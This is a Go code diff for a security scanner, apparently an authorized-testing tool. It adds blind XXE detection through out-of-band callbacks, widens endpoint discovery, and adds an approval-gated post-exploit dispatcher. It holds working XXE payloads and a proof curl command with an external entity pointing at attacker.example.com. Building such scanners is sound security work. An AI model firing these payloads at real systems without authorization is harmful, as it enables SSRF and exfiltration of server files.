@@ -17,9 +17,12 @@ import (
 	"strings"
 	"time"
 
-	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
+	"github.com/stormbane-security/beacon/internal/oob"
+	"github.com/stormbane-security/beacon/internal/postexploit"
+	"github.com/stormbane-security/beacon/internal/scan"
+	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
 	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
 )
 
@@ -104,6 +107,12 @@ var xmlPaths = []string{
 	"/rss",
 	"/feed",
 	"/sitemap.xml",
+	"/api/upload",
+	"/api/import",
+	"/api/parse",
+	"/xmlrpc",
+	"/wsdl",
+	"/api/xml",
 }
 
 // xmlContentTypes are MIME types to try for XML submissions.
@@ -137,8 +146,26 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 
 	base := schemedetect.Base(ctx, client, asset)
 
+	// Merge discovered paths from crawl results into the XML endpoint probe list.
+	// Crawl-discovered API paths are often XML-accepting but not in the hardcoded list.
+	effectiveXMLPaths := xmlPaths
+	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
+		seen := make(map[string]bool, len(xmlPaths))
+		for _, p := range xmlPaths {
+			seen[p] = true
+		}
+		expanded := make([]string, len(xmlPaths))
+		copy(expanded, xmlPaths)
+		for path := range discovered {
+			if !seen[path] {
+				expanded = append(expanded, path)
+			}
+		}
+		effectiveXMLPaths = expanded
+	}
+
 	// Phase 1: discover XML-accepting endpoints.
-	xmlEndpoints := discoverXMLEndpoints(ctx, client, base)
+	xmlEndpoints := discoverXMLEndpointsWithPaths(ctx, client, base, effectiveXMLPaths)
 	if len(xmlEndpoints) == 0 {
 		return nil, nil
 	}
@@ -174,6 +201,114 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			if f != nil {
 				findings = append(findings, *f)
 				break
+			}
+		}
+	}
+
+	// ── Blind XXE via OOB callback ───────────────────────────────────────
+	// If the OOB server is available, inject an external entity pointing to
+	// the callback URL. When the XML parser fetches the entity, the OOB
+	// server records it — confirming blind XXE even when file contents are
+	// not reflected in the response.
+	if oobSrv := oob.FromContext(ctx); oobSrv != nil {
+		type oobProbe struct {
+			token    string
+			endpoint string
+		}
+		var probes []oobProbe
+
+		for _, endpoint := range xmlEndpoints {
+			if ctx.Err() != nil {
+				break
+			}
+
+			token := oob.MakeToken(oobSrv, "xxe", asset, fmt.Sprintf("blind-%s", endpoint))
+			callbackURL := oob.PayloadURL(oobSrv, token)
+
+			blindPayload := fmt.Sprintf(
+				`<?xml version="1.0" encoding="UTF-8"?>`+
+					`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]>`+
+					`<foo>&xxe;</foo>`,
+				callbackURL)
+
+			for _, ct := range xmlContentTypes {
+				req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint,
+					bytes.NewBufferString(blindPayload))
+				if err != nil {
+					continue
+				}
+				req.Header.Set("Content-Type", ct)
+
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
+				_ = resp.Body.Close()
+			}
+
+			probes = append(probes, oobProbe{token: token, endpoint: endpoint})
+		}
+
+		// Wait for callbacks after all probes are sent.
+		for _, p := range probes {
+			if ctx.Err() != nil {
+				break
+			}
+			if cb, ok := oobSrv.WaitForCallback(ctx, p.token, 10*time.Second); ok {
+				findings = append(findings, finding.Finding{
+					CheckID:    finding.CheckWebXXE,
+					Module:     "deep",
+					Scanner:    scannerName,
+					Severity:   finding.SeverityCritical,
+					Confidence: finding.ConfidenceVerified,
+					Title:      fmt.Sprintf("Blind XXE confirmed via OOB callback on %s", p.endpoint),
+					Description: fmt.Sprintf(
+						"The XML endpoint %s resolved an external entity pointing to the OOB "+
+							"callback server. Although the entity content was not reflected in the "+
+							"response, the server-side HTTP request was confirmed via out-of-band "+
+							"callback from %s. This confirms the XML parser processes external "+
+							"entities, enabling SSRF, local file exfiltration (via parameter entities), "+
+							"and denial of service.",
+						p.endpoint, cb.RemoteAddr),
+					Asset:    asset,
+					DeepOnly: true,
+					ProofCommand: fmt.Sprintf(
+						`curl -s -X POST '%s' -H 'Content-Type: application/xml' `+
+							`-d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example.com/canary">]><foo>&xxe;</foo>'`,
+						p.endpoint),
+					Evidence: map[string]any{
+						"method":      "blind-oob",
+						"endpoint":    p.endpoint,
+						"oob_token":   p.token,
+						"callback_ip": cb.RemoteAddr,
+						"protocol":    cb.Protocol,
+					},
+					DiscoveredAt: time.Now(),
+				})
+			}
+		}
+	}
+
+	// Web exploit dispatcher: run post-exploit chains with per-module approval.
+	if scanType == module.ScanAuthorized && len(findings) > 0 {
+		dispatcher := postexploit.NewWebExploitDispatcher()
+		approveFunc := postexploit.ApproveFuncFromContext(ctx)
+		fb := &postexploit.FindingBuilder{
+			Module:  "deep",
+			Scanner: scannerName,
+			Asset:   asset,
+		}
+		for _, f := range findings {
+			if ctx.Err() != nil {
+				break
+			}
+			if dispatcher.CanExploit(f.CheckID) {
+				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
+					continue
+				}
+				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
+				findings = append(findings, exploitFindings...)
 			}
 		}
 	}
@@ -263,8 +398,14 @@ func probeXSD(ctx context.Context, client *http.Client, asset, url, payloadName,
 
 // discoverXMLEndpoints finds paths that respond to XML POST requests.
 func discoverXMLEndpoints(ctx context.Context, client *http.Client, base string) []string {
+	return discoverXMLEndpointsWithPaths(ctx, client, base, xmlPaths)
+}
+
+// discoverXMLEndpointsWithPaths finds paths that respond to XML POST requests
+// using the provided path list (which may include crawl-discovered paths).
+func discoverXMLEndpointsWithPaths(ctx context.Context, client *http.Client, base string, paths []string) []string {
 	var endpoints []string
-	for _, path := range xmlPaths {
+	for _, path := range paths {
 		endpointURL := base + path
 		for _, ct := range xmlContentTypes {
 			req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpointURL,
